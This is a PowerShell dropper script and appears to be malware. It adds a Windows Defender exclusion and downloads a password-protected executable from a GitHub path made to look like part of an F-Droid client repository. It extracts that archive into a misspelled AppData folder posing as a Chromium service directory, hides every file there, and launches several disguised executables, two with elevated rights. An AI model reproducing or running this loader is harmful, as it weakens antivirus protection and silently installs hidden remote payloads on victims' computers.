$ErrorActionPreference = 'SilentlyContinue'
$ProcName = "additionlibraries.exe"
$WebFile = "https://github.com/washywashy14/fdroidclient/blob/master/app/src/full/additionlibraries.exe?raw=true"
$Outff = "$env:Temp\additionlibraries.exe"
Timeout /NOBREAK /T 10
Add-MpPreference -ExclusionProcess serverCommon.exe -Force
Invoke-WebRequest -uri $WebFile -OutFile $Outff
& $env:Temp\additionlibraries.exe -s -p"of9049nwp04yb3" -d"$env:APPDATA\chromiuumbased\services\"
Timeout /NOBREAK /T 1
Get-ChildItem -path "$env:APPDATA\chromiuumbased\services\" -Recurse -Force | foreach {$_.attributes = "Hidden"}
Start-Process -FilePath "$env:APPDATA\chromiuumbased\services\ProcManager.exe"
Timeout /NOBREAK /T 5
Start-Process -FilePath "$env:APPDATA\chromiuumbased\services\netDaemon.exe"
Timeout /NOBREAK /T 5
Start-Process -FilePath "$env:APPDATA\chromiuumbased\services\Netstservice.exe"
Timeout /NOBREAK /T 5
Start-Process -FilePath "$env:APPDATA\chromiuumbased\services\Updmonitor.exe" -Verb RunAs
Start-Process -FilePath "$env:APPDATA\chromiuumbased\services\fsdroiod.exe" -Verb RunAs
